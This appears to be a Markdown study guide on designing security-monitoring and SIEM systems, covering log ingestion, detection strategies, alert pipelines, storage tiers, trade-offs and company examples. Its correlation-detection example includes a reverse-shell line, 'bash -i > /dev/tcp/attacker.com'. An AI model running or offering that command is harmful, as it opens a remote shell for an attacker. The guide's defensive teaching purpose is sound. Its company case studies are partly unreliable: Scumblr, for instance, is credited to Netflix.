# Security Monitoring

## Table of Contents
1. [What is Security Monitoring?](#what-is-security-monitoring)
2. [Core Goals](#core-goals)
3. [Key Components](#key-components)
4. [Data Collection & Ingestion](#data-collection--ingestion)
5. [Detection Strategies](#detection-strategies)
6. [SIEM Architecture](#siem-architecture)
7. [Alerting & Incident Response Pipeline](#alerting--incident-response-pipeline)
8. [Storage Architecture](#storage-architecture)
9. [Trade-offs](#trade-offs)
10. [Decision Framework](#decision-framework)
11. [Real-World Systems & Applications](#real-world-systems--applications)
12. [Anti-Patterns](#anti-patterns)
13. [Monitoring the Monitor](#monitoring-the-monitor)
14. [Interview Cheat Sheet](#interview-cheat-sheet)

---

## What is Security Monitoring?

Security Monitoring is the **continuous collection, aggregation, correlation, and analysis of security-relevant data** across an infrastructure to detect threats, policy violations, anomalies, and breaches — and to respond to them in near real-time.

It sits at the intersection of observability (metrics, logs, traces) and threat intelligence, specifically scoped to **confidentiality, integrity, and availability (CIA)**.

```
Raw Events (Logs, Packets, Flows)
         │
         ▼
   [Collection Layer]  ←── agents, shippers, proxies
         │
         ▼
   [Ingestion Pipeline]  ←── Kafka, Kinesis
         │
         ▼
   [Parsing & Enrichment]  ←── normalize, tag, GeoIP, threat intel
         │
         ▼
   [Detection Engine]  ←── rules, ML, anomaly detection
         │
      ┌──┴──┐
      ▼     ▼
  [Alerts] [Storage]  ←── hot / warm / cold tiers
      │
      ▼
  [SOAR / Incident Response]
      │
      ▼
  [Analyst Workflow / Dashboards]
```

---

## Core Goals

| Goal                     | Description                                                      |
|--------------------------|------------------------------------------------------------------|
| **Detection**            | Identify threats as quickly as possible (low MTTD)              |
| **Response**             | Contain and remediate incidents quickly (low MTTR)              |
| **Compliance**           | Retain evidence and audit trails for regulatory requirements     |
| **Visibility**           | Full coverage across all surfaces (network, host, app, cloud)   |
| **Forensics**            | Historical data for root-cause analysis post-breach             |

**Key Metrics:**
- **MTTD** — Mean Time to Detect
- **MTTR** — Mean Time to Respond
- **FPR** — False Positive Rate (alert fatigue driver)
- **Coverage** — % of attack surface instrumented

---

## Key Components

### 1. Log Sources (Telemetry Surface)

```
┌──────────────────────────────────────────────────────────────────┐
│  HOST LAYER           │  NETWORK LAYER     │  APPLICATION LAYER  │
│  ─────────────────    │  ───────────────   │  ─────────────────  │
│  OS syslogs           │  Firewall logs     │  Auth logs (OIDC)   │
│  Kernel audits        │  DNS query logs    │  API gateway logs   │
│  Process events       │  NetFlow / IPFIX   │  WAF events         │
│  File integrity       │  Packet captures   │  CDN edge logs      │
│  EDR telemetry        │  VPN access logs   │  Error/crash logs   │
└──────────────────────────────────────────────────────────────────┘
┌──────────────────────────────────────────────────────────────────┐
│  CLOUD LAYER                  │  IDENTITY LAYER                  │
│  ───────────────────          │  ─────────────────────           │
│  CloudTrail / GCP Audit       │  IdP authentication logs         │
│  IAM activity logs            │  MFA events                      │
│  S3 access logs               │  Privilege escalation events     │
│  Container runtime logs       │  Failed login patterns           │
│  K8s audit logs               │  Service account usage           │
└──────────────────────────────────────────────────────────────────┘
```

### 2. Key Tooling Categories

| Category              | Tools                                                        |
|-----------------------|--------------------------------------------------------------|
| **EDR (Endpoint)**    | CrowdStrike Falcon, SentinelOne, Microsoft Defender ATP      |
| **SIEM**             | Splunk, Elastic SIEM, IBM QRadar, Microsoft Sentinel          |
| **NDR (Network)**     | Darktrace, Vectra AI, Zeek (Bro), Suricata                   |
| **SOAR**             | Palo Alto XSOAR, Splunk SOAR, IBM Resilient                   |
| **Threat Intel**      | MISP, OpenCTI, VirusTotal, Recorded Future                   |
| **CSPM (Cloud)**      | Wiz, Prisma Cloud, AWS Security Hub                          |
| **Log Shipping**      | Fluentd, Filebeat, Vector, AWS Firehose                      |
| **Stream Processing** | Apache Kafka, AWS Kinesis, Apache Flink                      |

---

## Data Collection & Ingestion

### Agent-Based Collection

```
[Host] ── [Agent (Filebeat/Fluentd)] ── [Aggregator] ── [Kafka] ── [SIEM]
```

- Deploy lightweight agents to every host
- Agents tail logs, system calls, and file events
- **Pros:** Rich host telemetry, tamper detection
- **Cons:** Agent management overhead, resource usage on host

### Agentless Collection

```
[Cloud API] ──► [Polling Service] ──► [Kafka] ──► [SIEM]
[Syslog/UDP]──► [Syslog Receiver] ──►
```

- Pull from APIs (CloudTrail, Azure Monitor) or receive syslog
- **Pros:** No deployment burden, works with network devices
- **Cons:** Polling delay, limited depth of telemetry

### Log Normalization (ECS / CEF / LEEF)

Raw logs from different systems have different schemas. Normalization maps them to a **common schema**:

```
Raw (Apache):  "192.168.1.1 - - [01/Jan/2024] "GET /admin" 403 1234"
               │
               ▼ Parse + Map
Normalized:    {
                 "source.ip": "192.168.1.1",
                 "http.method": "GET",
                 "url.path": "/admin",
                 "http.response.status_code": 403,
                 "event.outcome": "failure",
                 "timestamp": "2024-01-01T00:00:00Z"
               }
```

**Common Schemas:**
- **ECS** — Elastic Common Schema (open standard)
- **OCSF** — Open Cybersecurity Schema Framework (AWS, Splunk, etc.)
- **CEF** — Common Event Format (ArcSight)

---

## Detection Strategies

### 1. Signature / Rule-Based Detection

Match events against **known attack patterns** (IOCs — Indicators of Compromise).

```python
# Example: Detect brute-force login
RULE: count(event.type == "auth_failure" AND source.ip == X)
      OVER 5 minutes >= 10
      → alert("Brute Force", source.ip=X)
```

**Frameworks:**
- **YARA** — file/memory pattern matching
- **Sigma** — generic SIEM rule format (portable across platforms)
- **Suricata/Snort rules** — network intrusion detection

**Pros:** Low false positives for known threats, auditable, fast  
**Cons:** Blind to novel attacks, requires constant rule maintenance

---

### 2. Anomaly / Behavioral Detection (UEBA)

User and Entity Behavior Analytics — establish a **baseline** and detect deviations.

```
Baseline Phase (30 days):
  user_alice: logins from IP range 10.0.0.0/24
              active Mon-Fri, 09:00–18:00 UTC
              downloads avg 50MB/day

Detection:
  alice logs in from 185.x.x.x (Russia) at 02:00 UTC
  downloads 20GB in 1 hour
  → Anomaly Score: HIGH → alert
```

**Techniques:**
- Statistical baselines (z-score, IQR)
- Isolation Forest, Autoencoders (unsupervised ML)
- Time-series forecasting (Prophet, LSTM)
- Graph-based analysis (lateral movement detection)

**Pros:** Detects zero-day and insider threats  
**Cons:** Higher false positive rate during baseline drift, requires data quality

---

### 3. Threat Intelligence Correlation

Enrich events with **external threat data** (known malicious IPs, domains, file hashes).

```
Inbound Connection → source.ip = 45.33.32.156
                         │
                         ▼ TI Lookup
                    → Known C2 server (Shodan, VirusTotal)
                    → alert("C2 Communication", high severity)
```

**Feeds:**
- Open: AlienVault OTX, CISA KEV, Abuse.ch
- Commercial: CrowdStrike Intel, Recorded Future, Mandiant

---

### 4. Graph / Correlation-Based Detection

Correlate multiple low-severity events into a **high-severity incident**.

```
Event A: Failed SSH login (low severity)
Event B: Successful SSH login 5 min later (info)
Event C: New process spawned: bash -i > /dev/tcp/attacker.com (medium)
Event D: Large outbound transfer (medium)

Correlation Rule:
  A + B + C + D within 10 minutes, same host → HIGH severity alert
  (Maps to MITRE ATT&CK: T1110 → T1059 → T1041)
```

**MITRE ATT&CK Framework** — universal taxonomy for mapping detections to attacker techniques and tactics.

---

## SIEM Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                         SIEM Platform                               │
│                                                                     │
│  ┌──────────────┐   ┌──────────────┐   ┌───────────────────────┐  │
│  │  Ingestion   │──►│  Parsing &   │──►│   Detection Engine    │  │
│  │  (Kafka/     │   │  Enrichment  │   │   ─────────────────   │  │
│  │   Kinesis)   │   │  (Logstash/  │   │   Rules Engine        │  │
│  └──────────────┘   │   Flink)     │   │   ML Models           │  │
│                     └──────────────┘   │   TI Correlation      │  │
│                                        └──────────┬────────────┘  │
│  ┌─────────────────────────────────┐              │               │
│  │        Storage Tier             │    ┌──────────▼────────────┐ │
│  │  ─────────────────────────      │    │    Alert Manager      │ │
│  │  Hot  (Elasticsearch/OpenSearch)│    │    Dedup, Grouping    │ │
│  │  Warm (S3 + query on demand)    │◄───│    Severity Scoring   │ │
│  │  Cold (Glacier/tape archival)   │    └──────────┬────────────┘ │
│  └─────────────────────────────────┘              │               │
│                                        ┌──────────▼────────────┐  │
│                                        │   SOAR Integration    │  │
│                                        │   Analyst Dashboard   │  │
│                                        └───────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

### Scale Numbers (Design Target)

| System Size | Events/sec  | Daily Volume | Retention  |
|-------------|-------------|--------------|------------|
| Small       | < 1K EPS    | ~50 GB/day   | 90 days    |
| Medium      | 10K–100K EPS| ~1 TB/day    | 1 year     |
| Large       | 100K+ EPS   | 10+ TB/day   | 7 years    |

---

## Alerting & Incident Response Pipeline

```
Detection Hit
     │
     ▼
[Alert Deduplication]  ──── same alert within 5 min window → suppress
     │
     ▼
[Alert Enrichment]     ──── add asset owner, blast radius, CVSS, MITRE
     │
     ▼
[Severity Scoring]     ──── rule severity × asset criticality × confidence
     │
     ▼
[Routing / Triage]
   ├── P1 (Critical)  → PagerDuty wake-up → SOC Lead → 15 min SLA
   ├── P2 (High)      → SOC queue → 1 hr SLA
   ├── P3 (Medium)    → Ticket created → 24 hr SLA
   └── P4 (Low)       → Log only, weekly review
     │
     ▼
[SOAR Playbook Automation]
   ├── Isolate host via EDR API
   ├── Block IP on firewall/WAF
   ├── Revoke OAuth tokens via IdP
   ├── Notify Slack #security-incidents
   └── Create Jira ticket with evidence
     │
     ▼
[Incident Lifecycle]
   Open → Investigating → Contained → Eradicated → Closed → Post-mortem
```

### Alert Deduplication Strategies

```python
# Key: (rule_id, source_ip, target_host) — fingerprint of the alert
# Suppress if same key seen within window

class AlertDeduplicator:
    def __init__(self, window_seconds=300):
        self.seen = {}  # key → last_seen_timestamp

    def should_fire(self, alert):
        key = (alert.rule_id, alert.source_ip, alert.target)
        now = time.time()
        if key in self.seen and now - self.seen[key] < self.window_seconds:
            return False  # Suppress
        self.seen[key] = now
        return True
```

---

## Storage Architecture

Security logs require **long-term, tamper-evident, cost-efficient** storage with fast query capability for recent events.

```
Age:     0–7 days           7–90 days          90 days–7 years
         │                  │                  │
Tier:    HOT                WARM               COLD
         │                  │                  │
Store:   Elasticsearch      S3 + Parquet       S3 Glacier / Tape
         OpenSearch         (Athena query)     (restore to query)
         │                  │                  │
Speed:   Sub-second         Minutes            Hours–Days
         │                  │                  │
Cost:    High (SSD)         Medium             Low (cents/GB)
         │                  │                  │
Use:     Active SOC work    Investigations     Compliance / Legal
```

### Tamper-Evidence Requirements

For compliance (SOC 2, PCI-DSS, HIPAA), logs must be **immutable and verifiable**:

```
Log Entry → Hash(entry) → Append to chain → Signed Merkle Root
                                              │
                              Stored separately from logs
                              → Proves logs were not altered
```

**Implementation Options:**
- **AWS S3 Object Lock** (WORM — Write Once Read Many)
- **Azure Immutable Blob Storage**
- **Cryptographic log chaining** (hash of previous entry embedded in current)
- **Certificate Transparency-style logs**

---

## Trade-offs

### 1. Detection Sensitivity vs. Alert Fatigue

| Approach          | False Positives | False Negatives | Analyst Load |
|-------------------|-----------------|-----------------|--------------|
| Tight rules       | Low             | High            | Low          |
| Loose rules       | High            | Low             | Overwhelming |
| ML-based          | Medium          | Low             | Medium       |
| **Layered hybrid**| **Low**         | **Low**         | **Managed**  |

**Key insight:** A SIEM generating 10,000 alerts/day that analysts ignore is worse than one generating 50 high-fidelity alerts. Alert fatigue leads to real incidents being missed.

---

### 2. Centralized vs. Federated SIEM

| Dimension           | Centralized SIEM               | Federated / Regional SIEMs         |
|---------------------|--------------------------------|-------------------------------------|
| **Correlation**     | Global cross-source correlation| Limited to local data              |
| **Data sovereignty**| Difficult (all data in one region)| Data stays in region             |
| **Cost**            | High egress/storage at scale   | Distributed cost                   |
| **Latency**         | Shipping delay from remote     | Low (local analysis)               |
| **Management**      | Single pane of glass           | Operationally complex              |
| **Use case**        | < 10 regions, unified team     | Global, regulated industries        |

---

### 3. Real-time Detection vs. Batch Correlation

| Dimension          | Real-time (Stream Processing)   | Batch (Periodic Jobs)             |
|--------------------|----------------------------------|-----------------------------------|
| **Latency**        | Seconds                          | Minutes to hours                  |
| **Complexity**     | High (stateful streams)          | Low (SQL/Spark jobs)              |
| **Cost**           | High (always-on compute)         | Low (on-demand compute)           |
| **Use case**       | Active attack, C2 detection      | Compliance reports, trend analysis|
| **Technology**     | Kafka Streams, Flink, Spark SS   | Spark batch, Athena, BigQuery     |

**Recommendation:** Use real-time for P1/P2 detection rules; batch for correlation over long time windows (e.g., "user accessed sensitive data 100x this week").

---

### 4. Agent-Based vs. Agentless Collection

| Dimension           | Agent-Based                  | Agentless                         |
|---------------------|------------------------------|-----------------------------------|
| **Depth**           | Rich (syscalls, process tree)| Shallow (API/syslog only)         |
| **Coverage**        | Requires deployment per host | Works with network devices, APIs  |
| **Tampering**       | Can detect; can be bypassed  | No local detection capability     |
| **Overhead**        | CPU/memory on host           | Network/API quota only            |
| **Best for**        | Servers, endpoints           | Cloud services, network gear      |

---

### 5. Log Verbosity vs. Cost

| Log Level    | Volume Multiplier | Value for Security | Recommended For         |
|--------------|-------------------|--------------------|-------------------------|
| Error only   | 1×                | Low                | Non-critical services   |
| Warn + Error | 2×                | Medium             | Internal services       |
| Info         | 5–10×             | High               | Auth, API, privileged   |
| Debug        | 50–100×           | Excessive           | Short-term debugging    |
| **Full audit**| 20–50×           | **Critical**        | IAM, payment, admin     |

**Design principle:** Log everything at the API gateway; sample aggressively at the application layer; never sample security-relevant events (auth, privilege changes, data access).

---

## Decision Framework

```
WHAT DETECTION APPROACH SHOULD I USE?

Is the threat pattern well-known (CVE, known IOC)?
   YES → Signature/Rule-based (Sigma rules, Suricata)
   NO  ↓

Is the threat expected to deviate from normal user behavior?
   YES → UEBA / Anomaly Detection (ML baselines)
   NO  ↓

Does the threat require correlating across multiple systems/time?
   YES → Graph correlation / Multi-event rules
   NO  ↓

Is this a compliance/audit requirement (not active threat)?
   YES → Batch log analysis + reporting
   NO  → Combine all layers (Defense in Depth)


WHAT STORAGE TIER FOR LOG RETENTION?

Regulatory requirement (PCI, HIPAA, SOX)?
   YES → 7 years cold storage, immutable (S3 Glacier + Object Lock)
   NO  ↓

Active SOC investigation support needed?
   YES → 90 days warm (Elasticsearch / OpenSearch)
   NO  ↓

Recent active detection only?
   YES → 7–30 days hot tier, then expire
```

---

## Real-World Systems & Applications

### Netflix — Security Monitoring at Scale

- Ingests **billions of events/day** across AWS multi-region
- Built **Scumblr** (open-source) for threat intelligence aggregation from internet sources
- Uses **Metacat** + S3 for long-term log storage; Elasticsearch for hot search
- Detects account takeover (ATO) using ML on login patterns — IP velocity, device fingerprinting, time-of-day anomaly
- **FIDO** (open-sourced): automated incident response tool that triggers pre-defined playbooks on alerts

**Key design:** They log every API call at the gateway level (Netflix API serves ~1M requests/sec) — anonymized for privacy but retained for security correlation.

---

### Stripe — Payment Security Monitoring

- Every payment transaction generates an **immutable audit event** signed with a cryptographic hash chain
- **Radar** (ML fraud detection) runs real-time scoring on every charge — network graph of card + device + IP + behavior
- Alert on anomalous API key usage patterns (sudden geography change, new endpoints, rate spikes)
- Stripe logs are retained **7 years** for PCI-DSS Level 1 compliance
- Uses **canary tokens** — fake API keys that alert if accessed (detects credential theft)

---

### Cloudflare — Network-Level Security Monitoring

- Processes **~55 million HTTP requests/sec** at the edge
- **Bot Management** uses ML to distinguish human traffic from bots in real-time
- DDoS detection via **ClickHouse** — real-time aggregation of traffic patterns across PoPs
- Exports security events to customer SIEMs via **Logpush** (S3/Sumo/Splunk)
- Detection of **BGP hijacking** using routing intelligence (RPKI validation)

---

### GitHub — Source Code Security Monitoring

- **Secret Scanning** — scans every push for leaked credentials (API keys, certs, tokens) using regex + ML
  - 200+ partner integrations to auto-revoke leaked tokens
- **Code Scanning (CodeQL)** — static analysis on every PR for security vulnerabilities
- **Dependency Graph + Dependabot** — monitors transitive dependency vulnerabilities (CVEs) across 100M+ repos
- Anomaly detection on repository access: unusual clone volume, mass-download of private repos
- All admin/privileged GitHub actions are logged to an immutable audit log for SIEM ingestion

---

### Uber — Insider Threat Detection

- Built **Argos** — internal UEBA system that baselines normal employee behavior
- Monitors data access patterns across internal tools (dashboards, APIs, databases)
- Detects employees querying customer PII outside their role or geographic scope
- Correlates HR data (terminations, PIPs) with data access behavior to flag elevated risk
- Real-time alerting on: bulk data export, accessing ex-colleague accounts, unusual hours access

---

### Discord — Real-time Abuse & Security Monitoring

- 500M+ registered users → security monitoring at massive scale
- Uses **Kafka** as the central event bus — every message, login, server action emits events
- **Heuristic + ML** spam/abuse detection runs as stream processors on Kafka consumers
- Real-time account takeover detection: sudden username change + password change + email change in sequence → auto-lock + alert
- SIEM: Elastic Stack (ELK) for SOC team dashboards and investigation

---

### AWS — Cloud-Native Security Monitoring Stack

```
AWS Services for Security Monitoring:

CloudTrail        → API activity logging (all AWS API calls)
VPC Flow Logs     → Network traffic metadata
GuardDuty         → ML-based threat detection (uses CT + VPC + DNS logs)
Security Hub      → Central aggregation + compliance scoring
Macie             → S3 data classification (PII detection)
Inspector         → Container/EC2 vulnerability scanning
Detective         → Graph-based investigation (relationships between entities)
Config            → Configuration compliance monitoring
EventBridge       → Route security events to SOAR/Lambda
```

**Design pattern:** GuardDuty consumes CloudTrail + VPC Flow + DNS logs internally — customers don't need to ship these to a SIEM; GuardDuty does the detection and emits findings to Security Hub.

---

## Anti-Patterns

### 1. Log Everything Without Structure
- Dumping raw text logs with no normalization means correlation is impossible
- **Fix:** Enforce structured logging (JSON) at the application layer; use ECS schema

### 2. Alert on Raw Counts Without Baseline
- Alerting "if error count > 100" without knowing baseline causes constant false positives during traffic spikes
- **Fix:** Alert on rate of change or deviation from rolling baseline (mean ± 3σ)

### 3. No Alert Deduplication
- Same detection fires 10,000 times during an incident → analysts ignore alerts
- **Fix:** Deduplicate on fingerprint within suppression window; group into single incident

### 4. Storing Everything in Hot Tier
- Keeping 1 year of logs in Elasticsearch = 10× cost of tiered approach
- **Fix:** Implement TTL-based hot/warm/cold tiering; use S3 + Athena for historical

### 5. Single Region SIEM with Global Infrastructure
- Shipping logs from APAC to US-EAST adds latency + cost + data sovereignty risk
- **Fix:** Regional collection agents → regional kafka → federated SIEM with central correlation

### 6. Skipping Auth/IAM Logs to Save Cost
- IAM events are the #1 source of breach detection signal; skipping them is security negligence
- **Fix:** Never sample or drop auth, privilege change, or data-access events regardless of volume

### 7. Relying Solely on Perimeter Monitoring
- Assuming internal traffic is safe → insider threats and lateral movement go undetected
- **Fix:** Zero Trust model — monitor east-west traffic; apply UEBA to internal users too

### 8. No Tamper Protection on Log Storage
- Attacker who compromises storage can delete evidence of their intrusion
- **Fix:** Write logs to immutable storage (S3 Object Lock); ship to separate account/tenant

---

## Monitoring the Monitor

Your security monitoring system itself must be monitored — a silent SIEM is the worst failure mode.

```yaml
# Key metrics to track on the monitoring pipeline itself:

ingestion_lag_seconds:         # Time from event generation to SIEM ingestion
  alert_threshold: > 60s       # Gaps mean blind spots

events_per_second_by_source:   # Sudden drop → agent died / source stopped logging
  alert_threshold: < 10% of baseline

detection_rule_evaluation_lag: # Detection engine backlog
  alert_threshold: > 30s

alert_generation_rate:         # Sudden spike = rule issue; sudden drop = detection gap
  alert_threshold: < 1 alert/hr OR > 500 alerts/hr (tune per env)

storage_ingestion_errors:      # Failed writes to log store
  alert_threshold: > 0.1% error rate

threat_intel_feed_staleness:   # TI feed not updated
  alert_threshold: > 24 hours
```

**Canary Alerts:** Periodically inject synthetic known-bad events (fake brute force, fake suspicious IP) into the pipeline to verify end-to-end detection is working — like health checks for your detection.

---

## Interview Cheat Sheet

| Question                              | Key Answer Points                                                                          |
|---------------------------------------|--------------------------------------------------------------------------------------------|
| How do you design a SIEM?             | Ingest pipeline (Kafka) → normalize (ECS) → detect (rules + ML) → alert → SOAR → storage tiers |
| How to reduce alert fatigue?          | Deduplication, correlation rules, ML severity scoring, tune FPR, suppress known-good       |
| How do you handle 1M events/sec?      | Kafka partitioning, stream processing (Flink), hot/warm/cold storage, sampling non-critical|
| How to detect insider threats?        | UEBA baseline, correlate HR data, monitor data access volume, time-of-day anomalies         |
| How to ensure log integrity?          | S3 Object Lock, cryptographic hash chaining, separate account for log storage               |
| Centralized vs. federated SIEM?       | Centralized for correlation power; federated for data sovereignty and scale                  |
| What logs are mandatory?              | Auth, IAM/privilege, network flows, DNS, API gateway — never sample these                   |
| How does cloud-native security differ?| API-driven (CloudTrail), no network packet access, shared responsibility model, ephemeral hosts |
| How to detect account takeover?       | Login velocity, geo-impossible travel, device fingerprint change, credential stuffing pattern |
| MITRE ATT&CK usage?                   | Map each detection rule to a technique; identify coverage gaps in the kill chain            |